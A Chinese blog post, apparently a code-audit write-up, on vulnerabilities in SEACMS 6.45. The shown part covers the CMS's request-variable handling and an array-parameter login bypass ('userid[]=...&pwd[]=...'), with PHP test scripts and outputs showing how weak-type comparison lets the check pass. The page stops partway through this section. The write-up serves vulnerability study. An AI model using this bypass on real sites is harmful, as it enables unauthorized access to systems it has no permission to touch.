@@ -1,0 +1,1220 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>SEACMS_6.45 - Mi3aka&#39;s Blog</title><meta name="Description" content="Mi3aka的博客"><meta property="og:title" content="SEACMS_6.45" />
+<meta property="og:description" content="SEACMS_6.45审计" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://mi3aka.eu.org/seacms_6.45/" /><meta property="og:image" content="https://mi3aka.eu.org/logo.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-03-12T14:08:34+00:00" />
+<meta property="article:modified_time" content="2022-03-12T14:08:34+00:00" /><meta property="og:site_name" content="Mi3aka&#39;s Blog" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://mi3aka.eu.org/logo.png"/>
+
+<meta name="twitter:title" content="SEACMS_6.45"/>
+<meta name="twitter:description" content="SEACMS_6.45审计"/>
+<meta name="application-name" content="Mi3aka&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="Mi3aka&#39;s Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://mi3aka.eu.org/seacms_6.45/" /><link rel="prev" href="https://mi3aka.eu.org/bluecms/" /><link rel="next" href="https://mi3aka.eu.org/dedecms_v5.7_sp2/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "SEACMS_6.45",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/mi3aka.eu.org\/seacms_6.45\/"
+        },"genre": "posts","wordcount":  4149 ,
+        "url": "https:\/\/mi3aka.eu.org\/seacms_6.45\/","datePublished": "2022-03-12T14:08:34+00:00","dateModified": "2022-03-12T14:08:34+00:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Mi3aka"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Mi3aka&#39;s Blog">Mi3aka</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 文章 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/about/"> 关于 </a><a class="menu-item" href="/links/"> 友链 </a><a class="menu-item" href="https://github.com/mi3aka/huaQ" rel="noopener noreffer" target="_blank"> Sec </a><a class="menu-item" href="https://tools.mi3aka.eu.org/" rel="noopener noreffer" target="_blank"> Tool </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Mi3aka&#39;s Blog">Mi3aka</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">文章</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/about/" title="">关于</a><a class="menu-item" href="/links/" title="">友链</a><a class="menu-item" href="https://github.com/mi3aka/huaQ" title="" rel="noopener noreffer" target="_blank">Sec</a><a class="menu-item" href="https://tools.mi3aka.eu.org/" title="" rel="noopener noreffer" target="_blank">Tool</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">SEACMS_6.45</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Mi3aka</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>代码审计</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2022-03-12">2022-03-12</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;约 4149 字&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;预计阅读 9 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#cms组成">cms组成</a></li>
+    <li><a href="#数组绕过登录">数组绕过&quot;登录&quot;</a></li>
+    <li><a href="#commentapiindexphp存在报错注入">comment/api/index.php存在报错注入</a></li>
+    <li><a href="#includemainclassphp存在eval代码执行">include/main.class.php存在eval代码执行</a></li>
+    <li><a href="#adminadmin_collect_newsphp存在注入无视waf">admin/admin_collect_news.php存在注入(无视waf)</a></li>
+    <li><a href="#adminadmin_templatephp存在目录穿越任意文件删除漏洞">admin/admin_template.php存在目录穿越/任意文件删除漏洞</a></li>
+    <li><a href="#adminadmin_collectphp存在任意文件读取">admin/admin_collect.php存在任意文件读取</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h2 id="cms组成">cms组成</h2>
+<p>首先,存在一个<code>360safe</code>文件夹,cms会自动包含<code>360safe</code>里面的<code>360webscan.php</code>进行防护</p>
+<p>而在<code>include/common.php</code>中有一个重要的功能是检查和注册外部提交的变量</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">foreach</span><span class="p">(</span><span class="nv">$_REQUEST</span> <span class="k">as</span> <span class="nv">$_k</span><span class="o">=&gt;</span><span class="nv">$_v</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$_k</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="nx">m_eregi</span><span class="p">(</span><span class="s1">&#39;^(cfg_|GLOBALS)&#39;</span><span class="p">,</span><span class="nv">$_k</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="nv">$_k</span><span class="p">])</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">exit</span><span class="p">(</span><span class="s1">&#39;Request var not allow!&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">_RunMagicQuotes</span><span class="p">(</span><span class="o">&amp;</span><span class="nv">$svar</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">get_magic_quotes_gpc</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span> <span class="nx">is_array</span><span class="p">(</span><span class="nv">$svar</span><span class="p">)</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">foreach</span><span class="p">(</span><span class="nv">$svar</span> <span class="k">as</span> <span class="nv">$_k</span> <span class="o">=&gt;</span> <span class="nv">$_v</span><span class="p">)</span> <span class="nv">$svar</span><span class="p">[</span><span class="nv">$_k</span><span class="p">]</span> <span class="o">=</span> <span class="nx">_RunMagicQuotes</span><span class="p">(</span><span class="nv">$_v</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$svar</span> <span class="o">=</span> <span class="nx">addslashes</span><span class="p">(</span><span class="nv">$svar</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$svar</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">foreach</span><span class="p">(</span><span class="k">Array</span><span class="p">(</span><span class="s1">&#39;_GET&#39;</span><span class="p">,</span><span class="s1">&#39;_POST&#39;</span><span class="p">,</span><span class="s1">&#39;_COOKIE&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="nv">$_request</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">foreach</span><span class="p">(</span><span class="nv">$$_request</span> <span class="k">as</span> <span class="nv">$_k</span> <span class="o">=&gt;</span> <span class="nv">$_v</span><span class="p">)</span> <span class="nv">${$_k}</span> <span class="o">=</span> <span class="nx">_RunMagicQuotes</span><span class="p">(</span><span class="nv">$_v</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>首先通过<code>m_eregi</code>检查变量名是否以敏感字符开头,如果检查到敏感字符则直接<code>exit</code></p>
+<p>而后面的两个<code>foreach</code>语句首先对传入的变量进行<code>addslashes</code>处理,然后<code>${$_k} = _RunMagicQuotes($_v)</code>进行变量注册</p>
+<h2 id="数组绕过登录">数组绕过&quot;登录&quot;</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$userid</span> <span class="o">=</span> <span class="nx">RemoveXSS</span><span class="p">(</span><span class="nx">stripslashes</span><span class="p">(</span><span class="nv">$userid</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$userid</span> <span class="o">=</span> <span class="nx">addslashes</span><span class="p">(</span><span class="nx">cn_substr</span><span class="p">(</span><span class="nv">$userid</span><span class="p">,</span> <span class="mi">60</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$pwd</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nx">md5</span><span class="p">(</span><span class="nv">$pwd</span><span class="p">),</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">20</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$row1</span> <span class="o">=</span> <span class="nv">$dsql</span><span class="o">-&gt;</span><span class="na">GetOne</span><span class="p">(</span><span class="s2">&#34;select * from sea_member where state=1 and username=&#39;</span><span class="si">$userid</span><span class="s2">&#39;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$row1</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="nv">$userid</span> <span class="k">and</span> <span class="nv">$row1</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="nv">$pwd</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;sea_user_id&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$row1</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;sea_user_name&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$row1</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;sea_user_group&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$row1</span><span class="p">[</span><span class="s1">&#39;gid&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;hashstr&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$hashstr</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$dsql</span><span class="o">-&gt;</span><span class="na">ExecuteNoneQuery</span><span class="p">(</span><span class="s2">&#34;UPDATE `sea_member` set logincount=logincount+1&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">ShowMsg</span><span class="p">(</span><span class="s2">&#34;成功登录，正在转向首页！&#34;</span><span class="p">,</span> <span class="s2">&#34;index.php&#34;</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">3000</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">exit</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">ShowMsg</span><span class="p">(</span><span class="s2">&#34;密码错误或账户已被禁用&#34;</span><span class="p">,</span> <span class="s2">&#34;login.php&#34;</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">3000</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">exit</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>假设传入<code>userid[]=123&amp;pwd[]=456</code>,<code>$userid</code>与<code>$pwd</code>均为数组</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$userid</span><span class="o">=</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;123&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">var_dump</span><span class="p">(</span><span class="nx">stripslashes</span><span class="p">(</span><span class="nv">$userid</span><span class="p">));</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><a href="https://3v4l.org/suHRm" target="_blank" rel="noopener noreffer ">https://3v4l.org/suHRm</a></p>
+<p>在<code>8.0</code>以上的版本会直接报错,而在<code>8.0</code>以下的版本会返回一个<code>Warning</code>警告,并返回<code>NULL</code></p>
+<hr>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$userid</span><span class="o">=</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;123&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">var_dump</span><span class="p">(</span><span class="nx">addslashes</span><span class="p">(</span><span class="nx">stripslashes</span><span class="p">(</span><span class="nv">$userid</span><span class="p">)));</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><a href="https://3v4l.org/KtiRJ" target="_blank" rel="noopener noreffer ">https://3v4l.org/KtiRJ</a></p>
+<p>而在外面包裹一个<code>addslashes</code>则会返回<code>string(0) &quot;&quot;</code></p>
+<hr>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$pwd</span><span class="o">=</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;456&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">var_dump</span><span class="p">(</span><span class="nx">md5</span><span class="p">(</span><span class="nv">$pwd</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="nx">var_dump</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nx">md5</span><span class="p">(</span><span class="nv">$pwd</span><span class="p">),</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">20</span><span class="p">));</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><a href="https://3v4l.org/ET69D" target="_blank" rel="noopener noreffer ">https://3v4l.org/ET69D</a></p>
+<p><code>md5</code>处理数组会返回<code>NULL</code>,而<code>substr</code>去处理<code>NULL</code>会返回<code>bool(false)</code></p>
+<hr>
+<p><code>$row1 = $dsql-&gt;GetOne(&quot;select * from sea_member where state=1 and username='$userid'&quot;);</code>此时传入的<code>$userid</code>为<code>string(0) &quot;&quot;</code>,而<code>$row1</code>得到的结果将会是<code>$row1['username']=NULL</code>和<code>$row1['password']=NULL</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$db</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">mysqli</span><span class="p">(</span><span class="s2">&#34;172.17.0.1&#34;</span><span class="p">,</span> <span class="s2">&#34;root&#34;</span><span class="p">,</span> <span class="s2">&#34;root&#34;</span><span class="p">,</span> <span class="s2">&#34;test&#34;</span><span class="p">,</span> <span class="s2">&#34;4000&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$userid</span><span class="o">=</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;123&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$pwd</span><span class="o">=</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;456&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$userid</span> <span class="o">=</span> <span class="nx">stripslashes</span><span class="p">(</span><span class="nv">$userid</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">var_dump</span><span class="p">(</span><span class="nv">$userid</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$userid</span> <span class="o">=</span> <span class="nx">addslashes</span><span class="p">(</span><span class="nv">$userid</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">var_dump</span><span class="p">(</span><span class="nv">$userid</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$pwd</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nx">md5</span><span class="p">(</span><span class="nv">$pwd</span><span class="p">),</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">20</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$result</span> <span class="o">=</span> <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s2">&#34;select * from test where username=&#39;</span><span class="si">$userid</span><span class="s2">&#39;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">var_dump</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$row</span><span class="o">=</span><span class="nv">$result</span><span class="o">-&gt;</span><span class="na">fetch_row</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nx">var_dump</span><span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">var_dump</span><span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">null</span>
+</span></span><span class="line"><span class="cl"><span class="nx">string</span> <span class="s1">&#39;&#39;</span> <span class="p">(</span><span class="nx">length</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nx">object</span><span class="p">(</span><span class="nx">mysqli_result</span><span class="p">)[</span><span class="mi">2</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">  <span class="k">public</span> <span class="s1">&#39;current_field&#39;</span> <span class="o">=&gt;</span> <span class="nx">int</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">  <span class="k">public</span> <span class="s1">&#39;field_count&#39;</span> <span class="o">=&gt;</span> <span class="nx">int</span> <span class="mi">2</span>
+</span></span><span class="line"><span class="cl">  <span class="k">public</span> <span class="s1">&#39;lengths&#39;</span> <span class="o">=&gt;</span> <span class="k">null</span>
+</span></span><span class="line"><span class="cl">  <span class="k">public</span> <span class="s1">&#39;num_rows&#39;</span> <span class="o">=&gt;</span> <span class="nx">int</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">  <span class="k">public</span> <span class="s1">&#39;type&#39;</span> <span class="o">=&gt;</span> <span class="nx">int</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl"><span class="k">null</span>
+</span></span><span class="line"><span class="cl"><span class="k">null</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><hr>
+<p>注意到<code>$row1['username'] == $userid and $row1['password'] == $pwd</code>这里是弱类型比较</p>
+<p><code>$row1['username']</code>为<code>NULL</code>,<code>$userid</code>为<code>string(0) &quot;&quot;</code>,弱类型比较为真</p>
+<p><code>$row1['password']</code>为<code>NULL</code>,<code>$pwd</code>为<code>bool(false)</code>,弱类型比较为真,因此成功&quot;登录&quot;</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203071925858.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203071925858.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203071925858.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203071925858.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203071925858.png"
+        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203071925858.png" /></p>
+<p>但是由于<code>member.php</code>会对<code>$_SESSION['sea_user_id']</code>,这种方式是没有更新<code>$_SESSION['sea_user_id']</code>所以实际上是没有登录的,但确实绕过了登录验证代码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
